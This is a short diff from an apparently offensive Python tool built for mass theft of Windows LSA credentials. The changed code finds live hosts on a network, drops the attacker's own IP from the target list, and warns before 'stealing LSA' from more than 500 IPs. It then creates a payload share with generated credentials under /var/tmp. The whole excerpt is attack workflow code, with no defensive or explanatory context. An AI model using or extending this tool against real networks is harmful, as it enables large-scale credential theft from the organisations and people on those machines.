@@ -1074,24 +1074,25 @@ if __name__ == '__main__':
                 except BaseException as exc:
                     continue
 
-            local_ip = input("\nEnter you local ip: ")
+            local_ip = input("\nEnter you local ip or interface: ")
 
             # lets you enter eth0 as the ip
             if local_ip in ifaces:
                 local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                 print("local IP => " + local_ip)
+                
+        if '-oe' not in sys.argv: # why scan if we not gonna do anything
+            addresses = do_ip(address) # gets a list of up hosts
+            try:
+                addresses.remove(local_ip) # no point in attacking ourselves
+            except:
+                pass
 
-        addresses = do_ip(address) # gets a list of up hosts
-        try:
-            addresses.remove(local_ip) # no point in attacking ourselves
-        except:
-            pass
-
-        if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
-            print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
-            choice = input("(N/y): ")
-            if choice.lower() == 'n':
-                exit(0)
+            if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
+                print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
+                choice = input("(N/y): ")
+                if choice.lower() == 'n':
+                    exit(0)
 
         share_name, share_user, share_pass, payload_name, share_group = setup_share() # creates and starts our share
         print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user,share_pass))
